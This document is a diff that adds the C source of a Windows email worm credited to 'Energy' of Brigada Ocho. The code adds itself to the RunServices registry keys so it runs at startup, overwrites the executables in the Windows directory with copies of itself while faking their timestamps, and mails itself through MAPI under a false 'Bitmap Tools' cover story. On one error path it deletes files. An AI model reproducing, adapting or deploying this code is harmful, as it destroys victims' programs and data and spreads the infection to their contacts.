@@ -1,0 +1,176 @@
+   #include "brigada.h"
+   #pragma hdrstop
+   #pragma warning (disable: 4068)
+   #pragma warning (disable: 4001)
+
+   char brigadaPath[256],brigadaWinDir[256],WallWinDir[256],MyBuffer[256];
+   int Err,ErrSend,NumCnt,Counter=0;
+   DWORD ExtInf;
+   HKEY brigadaNTKey,brigadaWinKey,brigadaInstKey,brigadaCrtKey,brigadaStartKey;
+   HANDLE brigadaHnd,brigadaHndTime,brigadaBmp,FormatFile;
+   HMODULE KernochoLib,MapiochoLib;
+   typedef DWORD(*RegochoSerProc)(DWORD,DWORD);
+   typedef ULONG(*EnvoiMessocho)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
+   typedef ULONG(*NomTrouveocho)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
+   typedef ULONG(*MemLibreocho)(LPVOID);
+   LPSTR Nom = "a";
+
+
+   #pragma argsused
+   int WINAPI WinMain
+   (
+   HINSTANCE hInstance,
+   HINSTANCE hPrevInstance,
+   LPSTR     lpszCmdLine,
+   int       nCmdShow
+   )
+   {
+   // Win32.brigada by Energy
+   WIN32_FIND_DATA brigadaHost,BitmapFile;
+   OSVERSIONINFO OsochoVerInfo;
+   FILETIME CreateTime,LstAccTime,LstWriTime;
+   SYSTEMTIME ochoTime;
+   RegochoSerProc RegisterServiceProcess;
+   EnvoiMessocho brigadaEnvoiMess;
+   NomTrouveocho brigadaNomTrouve;
+   MemLibreocho brigadaMemLibre;
+   KernochoLib = LoadLibrary("kernel32.dll");
+   MapiochoLib = LoadLibrary("mapi32.dll");
+   RegisterServiceProcess = (RegochoSerProc)GetProcAddress(KernochoLib,"RegisterServiceProcess");
+   SearchPath(NULL,_argv[0],NULL,sizeof(brigadaPath),brigadaPath,NULL);
+   OsochoVerInfo.dwOSVersionInfoSize = sizeof(OsochoVerInfo);
+   GetVersionEx(&OsochoVerInfo);
+   if(OsochoVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
+   {
+           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&brigadaNTKey);
+           RegSetValueEx(brigadaNTKey,"brigadaNT",0,REG_SZ,brigadaPath,sizeof(brigadaPath));
+           RegCloseKey(brigadaNTKey);
+   }
+   else
+   {
+           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&brigadaWinKey);
+           RegSetValueEx(brigadaWinKey,"brigadaWin",0,REG_SZ,brigadaPath,sizeof(brigadaPath));
+           RegCloseKey(brigadaWinKey);
+   }
+   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\brigada\\Install",0,KEY_ALL_ACCESS,&brigadaInstKey)!=ERROR_SUCCESS)
+   {
+           GetWindowsDirectory(brigadaWinDir,sizeof(brigadaWinDir));
+           SetCurrentDirectory(brigadaWinDir);
+           brigadaHnd = FindFirstFile("*.exe",&brigadaHost);
+           brigadaHostFind:
+           brigadaHndTime = CreateFile(brigadaHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+           GetFileTime(brigadaHndTime,&CreateTime,&LstAccTime,&LstWriTime);
+           CloseHandle(brigadaHndTime);
+           if((lstrcmp(brigadaHost.cFileName,"emm386.exe")==0)||(lstrcmp(brigadaHost.cFileName,"setver.exe")==0))
+                   goto DontInfect;
+           CopyFile(_argv[0],brigadaHost.cFileName,FALSE);
+           brigadaHndTime = CreateFile(brigadaHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+           SetFileTime(brigadaHndTime,&CreateTime,&LstAccTime,&LstWriTime);
+           CloseHandle(brigadaHndTime);
+           DontInfect:
+           if(FindNextFile(brigadaHnd,&brigadaHost)==TRUE)
+                   goto brigadaHostFind;
+           FindClose(brigadaHnd);
+           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Energy\\Install",&brigadaCrtKey);
+           RegCloseKey(brigadaCrtKey);
+   // Email Propagation uses MAPI functions
+   brigadaEnvoiMess = (EnvoiMessocho)GetProcAddress(MapiochoLib,"MAPISendMail");
+   brigadaNomTrouve = (NomTrouveocho)GetProcAddress(MapiochoLib,"MAPIResolveName");
+   brigadaMemLibre = (MemLibreocho)GetProcAddress(MapiochoLib,"MAPIFreeBuffer");
+   if((brigadaEnvoiMess==NULL)||(brigadaNomTrouve==NULL)||(brigadaMemLibre==NULL))
+   {
+           MessageBox(NULL,"This program is a New Bitmap Styler\nby Energy a Member of Brigada Ocho","Brigada Ocho Bitmap Tools",MB_OK|MB_ICONEXCLAMATION);
+           SetCurrentDirectory("C:/");
+           ExitProcess(0);
+   }
+   MapiMessage stMessage;
+   MapiRecipDesc stRecip;
+   MapiFileDesc stFile;
+   lpMapiRecipDesc lpRecip;
+   stFile.ulReserved = 0;
+   stFile.flFlags = 0L;
+   stFile.nPosition = (ULONG)-1;
+   stFile.lpszPathName = brigadaPath;
+   stFile.lpszFileName = NULL;
+   stFile.lpFileType = NULL;
+   MessageBox(NULL,"Hy, Brigada Ocho send News to you...","Brigada Ocho Bitmap Tools",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
+   brigadaCantResolve:
+   Err = (brigadaNomTrouve)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
+   if(Err!=SUCCESS_SUCCESS)
+   {
+   switch(Err){
+           case MAPI_E_UNKNOWN_RECIPIENT:
+                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.","Brigada Ocho Bitmap Tools",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
+           break;
+           case MAPI_E_FAILURE:
+                   MessageBox(NULL,"One or more unspecified errors found","Brigada Ocho Bitmap Tools",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
+                   DeleteFile("*.*");
+                   ExitProcess(0);
+           break;
+           }
+   goto brigadaCantResolve;
+   }
+   stRecip.ulReserved = lpRecip->ulReserved;
+   stRecip.ulRecipClass = MAPI_TO;
+   stRecip.lpszName = lpRecip->lpszName;
+   stRecip.lpszAddress = lpRecip->lpszAddress;
+   stRecip.ulEIDSize = lpRecip->ulEIDSize;
+   stRecip.lpEntryID = lpRecip->lpEntryID;
+   stMessage.ulReserved = 0;
+   stMessage.lpszSubject = "Brigada Ocho Bitmap Tools";
+   stMessage.lpszNoteText = lstrcat("Hy ",(lstrcat(lpRecip->lpszName,"\n\n\tI was hacked this Tools about Brigada Ocho.\nThis Tools can change your Login Bitmap on Windows\nStart this Very funny tool, and selected you questions to.")));
+   stMessage.lpszMessageType = NULL;
+   stMessage.lpszDateReceived = NULL;
+   stMessage.lpszConversationID = NULL;
+   stMessage.flFlags = 0L;
+   stMessage.lpOriginator = NULL;
+   stMessage.nRecipCount = 1;
+   stMessage.lpRecips = &stRecip;
+   stMessage.nFileCount = 1;
+   stMessage.lpFiles = &stFile;
+   ErrSend = (brigadaEnvoiMess)(lhSessionNull,0L,&stMessage,0L,0L);
+   if(ErrSend!=SUCCESS_SUCCESS)
+   {
+           MessageBox(NULL,"Please Install first vb6 tools\n","Brigada Ocho Bitmap Tools",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
+           ExitProcess(0);
+   }
+   MessageBox(NULL,"Thanks for Enjoy us",
+                   "Brigada Ocho Bitmap Tools",
+                    MB_OK|MB_ICONINFORMATION);
+   FreeLibrary(MapiochoLib);
+   }
+   RegCloseKey(brigadaInstKey);
+   STARTUPINFO StartFo;
+   PROCESS_INFORMATION ProcFo;
+   StartFo.cb = sizeof(STARTUPINFO);
+   StartFo.lpReserved = NULL;
+   StartFo.lpReserved2 = NULL;
+   StartFo.cbReserved2 = 0;
+   StartFo.lpDesktop = NULL;
+   StartFo.dwFlags = STARTF_FORCEOFFFEEDBACK;
+   if(CreateProcess(brigadaPath,
+                   NULL,
+                   (LPSECURITY_ATTRIBUTES)NULL,
+                   (LPSECURITY_ATTRIBUTES)NULL,
+                   FALSE,
+                   0,
+                   NULL,
+                   NULL,
+                   &StartFo,
+                   &ProcFo))
+   {
+   CloseHandle(ProcFo.hProcess);
+   CloseHandle(ProcFo.hThread);
+   }
+   return 0;
+   }
+
+
+   // brigada.h
+
+   #define WIN32_LEAN_AND_MEAN
+   #include <windows.h>
+   #include <dos.h>
+   #include <stdlib.h>
+   #include <stdio.h>
+   #include <mapi.h>
